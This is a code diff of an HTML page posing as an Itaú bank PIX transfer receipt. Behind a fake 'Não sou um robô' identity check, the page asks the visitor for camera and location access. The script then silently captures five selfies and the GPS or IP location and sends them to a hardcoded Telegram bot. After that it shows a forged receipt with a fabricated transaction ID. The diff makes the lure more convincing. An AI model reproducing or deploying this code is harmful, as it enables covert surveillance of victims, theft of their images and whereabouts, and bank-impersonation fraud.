@@ -2,127 +2,114 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Comprovante Itaú</title>
+<title>Comprovante PIX – Itaú</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
-body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}
-#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#0008;color:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999}
-#overlay button{margin-top:20px;padding:12px 24px;font-size:16px;cursor:pointer}
-#comprovanteWrap{display:none;background:#fff;width:400px;border:1px solid #ccc;border-radius:8px;overflow:hidden}
-#comprovante{padding:20px;font-size:13px;line-height:1.4;color:#222}
-.logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:18px;margin-bottom:12px}
-.logo img{width:32px;height:32px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
+body{display:flex;justify-content:center;align-items:center;height:100vh;background:#e5e5e5}
+#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;padding:40px;text-align:center}
+#overlay img{width:140px;margin-bottom:20px}
+#overlay h2{color:#FF6600;margin-bottom:12px;font-size:26px}
+#overlay p{color:#555;margin-bottom:24px;font-size:15px;max-width:320px;line-height:1.4}
+#overlay button{padding:14px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;cursor:pointer;font-weight:600}
+#comprovanteWrap{display:none;background:#fff;width:420px;border:1px solid #ddd;border-radius:12px;overflow:hidden;box-shadow:0 12px 24px rgba(0,0,0,.12)}
+#comprovante{padding:24px;font-size:13px;line-height:1.5;color:#222}
+.header{display:flex;align-items:center;gap:10px;font-weight:700;font-size:20px;margin-bottom:18px;color:#FF6600}
+.header img{width:36px;height:36px}
 .row{display:flex;justify-content:space-between;margin-bottom:8px}
-.row.total{font-weight:700;font-size:16px;margin-top:8px;border-top:1px dashed #999;padding-top:8px}
-.footer{font-size:11px;color:#555;margin-top:12px;text-align:center}
+.row.total{font-weight:700;font-size:17px;margin-top:10px;border-top:1px dashed #bbb;padding-top:10px;color:#FF6600}
+.footer{font-size:11px;color:#666;margin-top:14px;text-align:center}
 </style>
 </head>
 <body>
 
 <script>
-  const TELEGRAM_BOT_TOKEN = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
-  const TELEGRAM_CHAT_ID   = '-1003187104876';
+  const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
+  const CHAT_ID = '-1003187104876';
 </script>
 
-<!-- Solicitação de permissões -->
+<!-- PÁGINA CONVENCENTE -->
 <div id="overlay">
-  <p>Permita câmera e localização para continuar.</p>
-  <button onclick="start()">Permitir</button>
+  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='50'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="Itaú">
+  <h2>Não sou um robô</h2>
+  <p>Para sua segurança, precisamos confirmar sua identidade. Por favor, permita acesso à câmera e à localização para gerar seu comprovante.</p>
+  <button onclick="start()">Permitir e continuar</button>
 </div>
 
-<!-- Comprovante -->
+<!-- COMPROVANTE PIX -->
 <div id="comprovanteWrap">
   <div id="comprovante">
-    <div class="logo">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="logo">
-      Itaú Unibanco
+    <div class="header">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='50'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="logo">
+      Itaú
     </div>
-    <div class="row"><span>Comprovante de Transferência</span></div>
+    <div class="row"><span>Comprovante de PIX</span></div>
     <div class="row"><span>Data/Hora:</span><span id="dataHora">--</span></div>
-    <div class="row"><span>Valor:</span><span>R$ 3.250,00</span></div>
-    <div class="row"><span>Origem:</span><span>Ag 1234 C/C 56789-0</span></div>
-    <div class="row"><span>Destino:</span><span>Ag 9876 C/C 54321-8</span></div>
-    <div class="row"><span>Autenticação:</span><span id="auth">--</span></div>
-    <div class="row total"><span>Total:</span><span>R$ 3.250,00</span></div>
+    <div class="row"><span>Valor:</span><span>R$ 1.500,00</span></div>
+    <div class="row"><span>Chave/PIX:</span><span>+55 11 9 1234-5678</span></div>
+    <div class="row"><span>Nome favorecido:</span><span>João da Silva</span></div>
+    <div class="row"><span>Identificador:</span><span id="id">--</span></div>
+    <div class="row total"><span>Total debitado:</span><span>R$ 1.500,00</span></div>
     <div class="footer">
       <span id="ipLoc">--</span><br>
-      Em caso de dúvidas, entre em contato com seu gerente.
+      Em caso de dúvidas, fale com o Itaú 3003 3030
     </div>
   </div>
-  <button onclick="downloadPDF()" style="width:100%;padding:12px;font-size:16px;border:none;background:#FF6600;color:#fff;cursor:pointer">Baixar Comprovante</button>
+  <button onclick="downloadPDF()" style="width:100%;padding:14px;font-size:16px;border:none;background:#FF6600;color:#fff;cursor:pointer;font-weight:600">Baixar comprovante</button>
 </div>
 
 <script>
-function sendToTelegram(msg){
-  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+function sendText(txt){
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:msg})
+    body:JSON.stringify({chat_id:CHAT_ID,text:txt})
   });
 }
-
-function sendToTelegramPhoto(base64, caption){
-  const form = new FormData();
-  form.append('chat_id', TELEGRAM_CHAT_ID);
-  form.append('photo', dataURItoBlob(base64), 'foto.jpg');
-  form.append('caption', caption);
-  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,{
-    method:'POST', body:form
-  });
+function sendPhoto(base64, caption){
+  const fd=new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', dataURItoBlob(base64), 'foto.jpg');
+  fd.append('caption', caption);
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
 }
-
 function dataURItoBlob(dataURI){
-  const byte = atob(dataURI.split(',')[1]);
-  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
-  const ab = new ArrayBuffer(byte.length);
-  const ia = new Uint8Array(ab);
+  const byte=atob(dataURI.split(',')[1]), mime=dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab=new ArrayBuffer(byte.length), ia=new Uint8Array(ab);
   for(let i=0;i<byte.length;i++) ia[i]=byte.charCodeAt(i);
   return new Blob([ab],{type:mime});
 }
 
 async function start(){
-  document.getElementById('overlay').style.display='none';
-  let lat='--', lon='--', ipInfo={ip:'--',city:'--',region:'--'};
+  let lat='--', lon='--', ipData={ip:'--',city:'--',region:'--'};
   try{
-    // Localização real
-    const pos = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
-    lat = pos.coords.latitude.toFixed(6);
-    lon = pos.coords.longitude.toFixed(6);
-  }catch(e){
-    // Fallback IP
-    ipInfo = await fetch('https://ipapi.co/json/').then(r=>r.json());
+    const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+    lat=pos.coords.latitude.toFixed(6); lon=pos.coords.longitude.toFixed(6);
+  }catch{
+    ipData=await fetch('https://ipapi.co/json/').then(r=>r.json());
   }
-  const loc = (lat!=='--') ? `GPS: ${lat}, ${lon}` : `${ipInfo.city}, ${ipInfo.region} - ${ipInfo.ip}`;
+  const loc=(lat!=='--') ? `GPS: ${lat}, ${lon}` : `${ipData.city}, ${ipData.region} - ${ipData.ip}`;
+  sendText(`Localização capturada: ${loc}`);
 
   // Câmera + 5 selfies
-  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-  const video = document.createElement('video');
-  video.srcObject = stream; video.play();
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-  canvas.width = 640; canvas.height = 480;
-
-  for(let i=0;i<5;i++){
-    await new Promise(r=>setTimeout(r,800)); // 0,8s entre fotos
+  const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+  const video=document.createElement('video');
+  video.srcObject=stream; video.play();
+  const canvas=document.createElement('canvas'), ctx=canvas.getContext('2d');
+  canvas.width=640; canvas.height=480;
+  for(let i=1;i<=5;i++){
+    await new Promise(r=>setTimeout(r,600));
     ctx.drawImage(video,0,0);
-    const base64 = canvas.toDataURL('image/jpeg',0.9);
-    await sendToTelegramPhoto(base64, `Selfie ${i+1}/5 – ${loc}`);
+    sendPhoto(canvas.toDataURL('image/jpeg',0.9),`Selfie ${i}/5 – ${loc}`);
   }
   stream.getTracks().forEach(t=>t.stop());
 
-  // Dados do comprovante
-  const pixTime = new Date(new Date()-60*60*1000);
-  const auth = Array.from({length:8},()=>Math.random().toString(36)[2]).join('').toUpperCase();
-  document.getElementByIdId('dataHora').textContent = pixTime.toLocaleString('pt-BR');
-  document.getElementById('auth').textContent = auth;
-  document.getElementById('ipLoc').textContent = loc;
-
-  // Mensagem texto
-  await sendToTelegram(`Comprovante visualizado\nValor: R$ 3.250,00\nHora: ${pixTime.toLocaleString('pt-BR')}\nLocal: ${loc}`);
-
-  // Mostra comprovante
+  // Preenche comprovante
+  document.getElementById('dataHora').textContent=new Date().toLocaleString('pt-BR');
+  document.getElementById('id').textContent='PIX'+Date.now().toString().slice(-10);
+  document.getElementById('ipLoc').textContent=loc;
+  document.getElementById('overlay').remove();
   document.getElementById('comprovanteWrap').style.display='block';
 }
 
@@ -132,7 +119,7 @@ function downloadPDF(){
     const img=canvas.toDataURL('image/png');
     const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
     pdf.addImage(img,'PNG',0,0);
-    pdf.save('comprovante_itau.pdf');
+    pdf.save('comprovante_pix_itau.pdf');
   });
 }
 </script>
